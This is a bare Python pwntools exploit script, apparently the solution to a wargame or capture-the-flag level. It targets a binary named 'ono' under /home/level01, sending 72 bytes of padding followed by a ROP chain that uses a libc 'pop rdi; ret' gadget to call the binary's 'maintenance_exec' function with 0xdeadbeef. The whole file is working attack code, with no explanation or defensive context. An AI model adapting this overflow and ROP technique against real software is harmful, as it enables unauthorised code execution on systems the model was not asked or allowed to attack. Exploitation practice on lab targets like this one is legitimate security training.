
import sys
import struct
from pwn import * 

context.arch = "amd64"
context.log_level = 'critical'

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc.address = 0x7ffff7c00000
ono = ELF("/home/level01/ono")

rop = ROP(libc)

ROP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
WIN_FUNC = ono.sym["maintenance_exec"]

rop_chain = b""
rop_chain += p64(ROP_RDI)
rop_chain += p64(0xdeadbeef)
rop_chain += p64(WIN_FUNC)

exploit = b"A"*(8 + 64)
exploit += rop_chain
exploit += b"\n"

sys.stdout.buffer.write(exploit)